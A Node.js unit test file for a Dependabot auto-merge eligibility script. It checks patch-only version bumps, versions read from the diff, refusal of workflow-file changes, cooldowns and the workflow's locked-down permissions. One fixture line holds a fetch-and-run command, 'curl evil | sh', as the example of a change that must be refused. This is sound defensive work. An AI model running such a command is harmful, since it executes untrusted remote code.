// Unit tests for the dependabot-automerge eligibility rules and the workflow's safety shape.
// Hermetic: no network. Run by `ci / flake-policy tests` (node --test ".github/scripts/*.test.mjs").

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

import { classify, diffVersions, filesAreSafe, isPatchUpdate, parseTitle } from './dependabot-automerge.mjs';

const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const pom = [{ filename: 'saiku-core/pom.xml', patch: '-<version>1.0.0</version>\n+<version>1.0.1</version>' }];
const pkg = [{ filename: 'saiku-ui/package.json', patch: '-    "foo": "^1.2.3",\n+    "foo": "^1.2.4",' }];
const lock = [{ filename: 'saiku-ui/package-lock.json', patch: '-        "version": "1.2.3"\n+        "version": "1.2.4"' }];

const usesFile = (patch) => [{ filename: '.github/workflows/ci.yml', patch }];

test('parseTitle accepts single-package bumps and rejects groups', () => {
  assert.deepEqual(parseTitle('Bump foo from 1.2.3 to 1.2.4'), { name: 'foo', from: '1.2.3', to: '1.2.4' });
  assert.deepEqual(parseTitle('build(deps): bump foo from 1.2.3 to 1.2.4 in /saiku-ui'), { name: 'foo', from: '1.2.3', to: '1.2.4' });
  assert.equal(parseTitle('Bump the dev-tooling group across 1 directory with 3 updates'), null);
  assert.equal(parseTitle('bump the maven group in / with 2 updates'), null);
  assert.equal(parseTitle('Update README'), null);
});

test('isPatchUpdate allows only same major.minor with a higher patch', () => {
  assert.equal(isPatchUpdate('1.2.3', '1.2.4'), true);
  assert.equal(isPatchUpdate('1.2.3', '1.3.0'), false);
  assert.equal(isPatchUpdate('1.2.3', '2.0.0'), false);
  assert.equal(isPatchUpdate('1.2.3', '1.2.4-beta.1'), false);
  assert.equal(isPatchUpdate('1.2.4', '1.2.3'), false);
});

test('diffVersions reads the version pair from the diff, not the title', () => {
  assert.deepEqual(diffVersions(pom), { ok: true, from: '1.0.0', to: '1.0.1' });
  assert.deepEqual(diffVersions(pkg), { ok: true, from: '1.2.3', to: '1.2.4' });
  // package.json and package-lock.json in one PR: one identical pair across both files
  assert.deepEqual(diffVersions([...pkg, ...lock]), { ok: true, from: '1.2.3', to: '1.2.4' });
  // maven property form (the root pom shadows BOM versions through properties)
  assert.deepEqual(
    diffVersions([{ filename: 'pom.xml', patch: '-    <jackson.version>2.18.6</jackson.version>\n+    <jackson.version>2.18.7</jackson.version>' }]),
    { ok: true, from: '2.18.6', to: '2.18.7' }
  );
  // unchanged on one side, several versions, or no version token at all: unprovable
  assert.equal(diffVersions([{ filename: 'saiku-ui/package.json', patch: '+    "foo": "^1.2.4",' }]).ok, false);
  assert.equal(
    diffVersions([{ filename: 'pom.xml', patch: '-<version>1.0.0</version>\n+<version>1.0.1</version>\n-<version>2.0.0</version>\n+<version>2.0.1</version>' }]).ok,
    false
  );
  assert.equal(diffVersions([{ filename: 'saiku-ui/package.json', patch: '-    "main": "src/index.js"\n+    "main": "src/main.js"' }]).ok, false);
  assert.equal(diffVersions([]).ok, false);
});

test('diffVersions refuses a maven hunk that looks like a build-plugin change', () => {
  // a version inside a <plugin> block (context lines carry <plugin> or *.plugin.version)
  assert.equal(
    diffVersions([{
      filename: 'pom.xml',
      patch: '@@ -10,7 +10,7 @@\n       <plugin>\n         <groupId>org.apache.maven.plugins</groupId>\n         <artifactId>maven-shade-plugin</artifactId>\n-        <version>3.6.0</version>\n+        <version>3.6.1</version>',
    }]).ok,
    false
  );
  assert.equal(
    diffVersions([{ filename: 'pom.xml', patch: '-    <maven-shade-plugin.version>3.6.0</maven-shade-plugin.version>\n+    <maven-shade-plugin.version>3.6.1</maven-shade-plugin.version>' }]).ok,
    false
  );
  // a dependency block whose context names no plugin is fine
  assert.equal(
    diffVersions([{
      filename: 'saiku-core/pom.xml',
      patch: '@@ -1,7 +1,7 @@\n       <dependency>\n         <groupId>com.fasterxml.jackson.core</groupId>\n         <artifactId>jackson-databind</artifactId>\n-        <version>2.18.6</version>\n+        <version>2.18.7</version>',
    }]).ok,
    true
  );
});

test('filesAreSafe requires manifests and lockfiles, never workflow files', () => {
  assert.equal(filesAreSafe(pom), true);
  assert.equal(filesAreSafe(lock), true);
  assert.equal(filesAreSafe([...pkg, ...lock]), true);
  // any file under .github/workflows/ disqualifies the PR (#2548), uses:-only or not
  assert.equal(filesAreSafe(usesFile('-      - uses: actions/checkout@aaa\n+      - uses: actions/checkout@bbb')), false);
  assert.equal(filesAreSafe(usesFile('-      - run: curl evil | sh')), false);
  assert.equal(filesAreSafe([{ filename: '.github/workflows/ci.yml' }]), false);
  assert.equal(filesAreSafe([...pom, { filename: '.github/workflows/dependabot-automerge.yml', patch: '-      - uses: a/b@x\n+      - uses: a/b@y' }]), false);
  assert.equal(filesAreSafe([...pom, { filename: 'src/Main.java' }]), false);
  assert.equal(filesAreSafe([]), false);
});

test('classify auto-merges a single maven patch bump, proven by the diff', () => {
  const result = classify({ title: 'Bump foo from 1.0.0 to 1.0.1', labels: ['dependencies', 'maven'], files: pom });
  assert.equal(result.eligible, true);
});

test('classify never auto-merges a github-actions bump, even a patch (#2548)', () => {
  const patch = '-      - uses: a/b@x\n+      - uses: a/b@y';
  // labelled github-actions, and/or touching .github/workflows/ — both refuse
  assert.equal(classify({ title: 'Bump a/b from 4.1.0 to 4.1.1', labels: ['github-actions'], files: usesFile(patch) }).eligible, false);
  assert.equal(classify({ title: 'Bump a/b from abc1234 to def5678', labels: ['github-actions'], files: usesFile(patch) }).eligible, false);
  assert.equal(classify({ title: 'Bump a/b from 4.1.0 to 4.1.1', labels: ['dependencies', 'maven'], files: usesFile(patch) }).eligible, false);
  assert.equal(classify({ title: 'Bump a/b from abc1234 to def5678', labels: ['github-actions'], files: lock }).eligible, false);
});

test('classify refuses majors, minors, groups, docker, unlabelled, non-manifests and title/diff mismatch', () => {
  const labels = ['dependencies', 'npm'];
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 2.0.0', labels, files: [...pkg, ...lock] }).eligible, false);
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.3.0', labels, files: [...pkg, ...lock] }).eligible, false);
  assert.equal(classify({ title: 'Bump the dev-tooling group with 2 updates', labels, files: [...pkg, ...lock] }).eligible, false);
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: ['docker'], files: [...pkg, ...lock] }).eligible, false);
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: [], files: [...pkg, ...lock] }).eligible, false);
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels, files: [{ filename: 'a.java' }] }).eligible, false);
  // the title is only a cross-check: a triager editing it cannot change eligibility
  assert.equal(classify({ title: 'Bump foo from 1.2.3 to 2.0.0', labels, files: [...pkg, ...lock] }).eligible, false);
  assert.equal(classify({ title: 'Bump foo from 9.9.9 to 1.2.4', labels, files: [...pkg, ...lock] }).eligible, false);
});

test('classify auto-merges an npm patch bump whose versions come from package.json and the lockfile', () => {
  const result = classify({ title: 'Bump foo from 1.2.3 to 1.2.4', labels: ['dependencies', 'npm'], files: [...pkg, ...lock] });
  assert.equal(result.eligible, true);
});

test('.github/dependabot.yml holds every ecosystem back with a cooldown of at least 3 days', () => {
  const text = readFileSync(join(root, '.github', 'dependabot.yml'), 'utf8');
  const blocks = text.split(/^\s*-\s+package-ecosystem:/m).slice(1);
  assert.equal(blocks.length, 4, 'four ecosystems: maven, github-actions, docker, npm');
  for (const block of blocks) {
    const ecosystem = block.split('\n')[0].trim();
    const match = /cooldown:\s*\n\s+default-days:\s*(\d+)/.exec(block);
    assert.ok(match, `${ecosystem} sets a cooldown default-days`);
    assert.ok(Number(match[1]) >= 3, `${ecosystem} cooldown is at least 3 days (got ${match[1]})`);
  }
});

test('the workflow keeps its safety shape', () => {
  const text = readFileSync(join(root, '.github', 'workflows', 'dependabot-automerge.yml'), 'utf8');
  const code = text.replace(/^\s*#.*$/gm, '');
  assert.match(code, /^permissions: \{\}$/m);
  assert.match(code, /timeout-minutes: 10/);
  assert.match(code, /workflow_run:\s*\n\s+workflows: \[ci\]/);
  assert.doesNotMatch(code, /actions\/checkout/);
  assert.doesNotMatch(code, /^\s+uses:/m, 'no third-party actions');
  assert.doesNotMatch(code, /pull_request_target/);
  const scripts = [...code.matchAll(/^\s+run: (.+)$/gm)].map((m) => m[1]).join('\n');
  assert.doesNotMatch(scripts, /\$\{\{/, 'expressions only in env:, never in run: scripts');
  assert.doesNotMatch(code, /--(squash|rebase|merge|admin)\b/);
});
